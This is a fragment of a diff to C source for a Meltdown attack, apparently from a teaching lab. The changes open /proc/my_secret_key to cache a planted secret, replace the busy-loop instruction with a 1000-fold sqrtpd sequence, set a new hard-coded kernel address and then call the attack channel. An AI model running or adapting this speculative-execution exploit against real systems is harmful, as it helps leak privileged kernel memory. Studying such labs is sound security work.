@@ -94,10 +94,19 @@ int meltdown(unsigned long kernel_addr){
 //Improve the attack with arithmetic instruction
 void meltdown_busy_loop(unsigned long kernel_addr){
     char kernel_data = 0;
+//"add $0x141, %%eax;"
 
+    // Cache the data to improve success
+    int fd = open("/proc/my_secret_key", O_RDONLY);
+    if(fd<0){
+        perror("open");
+        return;
+    }
+    // int ret = pread(fd, NULL, 0, 0);    //Data is cached
+   
     asm volatile(
-        ".rept 400;"
-        "add $0x141, %%eax;"
+        ".rept 1000;"    
+        "sqrtpd %%xmm0,%%xmm0;"
         ".endr;"
         
         :
@@ -114,14 +123,14 @@ void catch_segv(){
 
 int main(){
 	char* testStr = "abcd";
-    unsigned long kernel_addr = 0xfa4e3024	;
+    unsigned long kernel_addr = 0xf8738000;
 
     //prefetch data into L1 cache
     // __builtin_prefetch((char*)kernel_addr);
     // _mm_prefetch((char*)kernel_addr, 3);
 
     int i;
-    for(i=1;i<10000;){
+    for(i=1;i<10000;)	{
     	i+=10;
     }
 //	kernel_addr = testStr;
@@ -147,3 +156,4 @@ int main(){
 
     attackChannel_x86();
 }
+	
